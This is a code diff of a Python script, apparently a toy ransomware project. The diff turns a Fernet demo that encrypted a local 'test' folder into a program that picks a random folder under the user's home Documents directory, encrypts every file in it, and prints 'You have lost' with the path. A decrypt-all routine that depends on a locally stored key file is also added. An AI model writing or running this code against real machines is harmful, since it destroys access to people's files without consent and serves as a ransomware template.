@@ -1,19 +1,35 @@
 from cryptography.fernet import Fernet
 import os
+from pathlib import Path
+import random
+
+
+
+
+def main():
 # Generate a key
-key = Fernet.generate_key()
+    key = Fernet.generate_key()
 
-# Save the key into a file
-with open('filekey.key', 'wb') as f:
-    f.write(key)
+    # Save the key into a file
+    with open('filekey.key', 'wb') as f:
+        f.write(key)
 
 
-# Load the key from the .key file
-with open('filekey.key', 'rb') as f:
-    key = f.read()
+    # Load the key from the .key file
+    with open('filekey.key', 'rb') as f:
+        key = f.read()
 
-# Create a Fernet object using the key
-fernet = Fernet(key)
+    # Create a Fernet object using the key
+    global fernet
+    fernet= Fernet(key)
+
+    DOCUMENTS = Path.home() / 'Documents'
+    files=os.listdir(DOCUMENTS)
+    i=random.randint(0,len(files)-1)
+    path= (str(DOCUMENTS)+"/"+files[i]+"/")
+    print ("You have lost "+path)
+    encryptAll(path)
+
 
 def encrypt(file):
     # Open the file to be encrypted in binary read mode
@@ -49,8 +65,23 @@ def decrypt(file):
 
 
 
-directory="test"
-for root, _, files in os.walk(directory):
-    for filename in files:  # loop through files in the current directory
-        path=os.path.join(root, filename)
-        encrypt(path)
+
+def encryptAll(directory):
+    for root, _, files in os.walk(directory):
+        for filename in files:  # loop through files in the current directory
+            path=os.path.join(root, filename)
+            encrypt(path)
+    with open("encryptedLocation.txt", 'w') as g:
+        g.write(directory+"\n")
+    g.close()
+
+def decryptAll():
+    g = open("encryptedLocation.txt", 'r')
+    for line in g.readlines():
+        newLine = line.strip("\n")
+        for root, _, files in os.walk(newLine):
+            for filename in files:  # loop through files in the current directory
+                path=os.path.join(root, filename)
+                decrypt(path)
+    os.remove("encryptedLocation.txt")
+    os.remove("filekey.key")
